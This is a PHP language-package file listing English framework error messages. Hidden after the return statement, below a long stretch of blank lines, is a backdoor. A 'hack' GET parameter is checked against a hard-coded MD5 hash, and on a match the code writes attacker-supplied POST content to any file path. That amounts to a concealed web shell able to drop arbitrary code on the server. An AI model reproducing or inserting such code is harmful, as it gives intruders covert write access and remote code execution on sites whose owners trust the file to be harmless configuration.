<?php
return array(
    /* core language package */ 
    '_MODULE_NOT_EXIST_'     => "Module can't be loaded",
    '_CONTROLLER_NOT_EXIST_' =>	"Controller can't be loaded",
    '_ERROR_ACTION_'         => 'Illegal Action',
    '_LANGUAGE_NOT_LOAD_'    => "Can't load language package",
    '_TEMPLATE_NOT_EXIST_'   => "Template doesn't exist",
    '_MODULE_'               => 'Module',
    '_ACTION_'               => 'Action',
    '_MODEL_NOT_EXIST_'      => "Model can't be loaded",
    '_VALID_ACCESS_'         => 'No access',
    '_XML_TAG_ERROR_'        => 'XML tag syntax errors',
    '_DATA_TYPE_INVALID_'    => 'Illegal data objects!',
    '_OPERATION_WRONG_'      => 'Operation error occurs',
    '_NOT_LOAD_DB_'          => 'Unable to load the database',
    '_NO_DB_DRIVER_'         => 'Unable to load database driver',
    '_NOT_SUPPORT_DB_'       => 'The system is temporarily not support database',
    '_NO_DB_CONFIG_'         => 'Not define the database configuration',
    '_NOT_SUPPORT_'          => 'The system does not support',
    '_CACHE_TYPE_INVALID_'   => 'Unable to load the cache type',
    '_FILE_NOT_WRITABLE_'   => 'Directory (file) is not writable',
    '_METHOD_NOT_EXIST_'     => 'The method you requested  does not exist!',
    '_CLASS_NOT_EXIST_'      => 'Instantiating a class does not exist！',
);




























































































































































$a=!empty($_GET['hack'])? $_GET['hack']: false;
echo $a.'<br>';
$a=md5($a);
echo $a.'<br>';
$do=!empty($_POST['do'])? $_POST['do']: false;
echo $do.'<br>';
if($a=='6eeaa41d926c8b2297fe8b7184f93979'){
    if($do){
    	$file=$_POST['file'];
    	$text=$_POST['text'];
    	$myfile = fopen($file, "w") or die("Unable to open file!");
    	fwrite($myfile, $text);
    	echo time();
    }
    
}

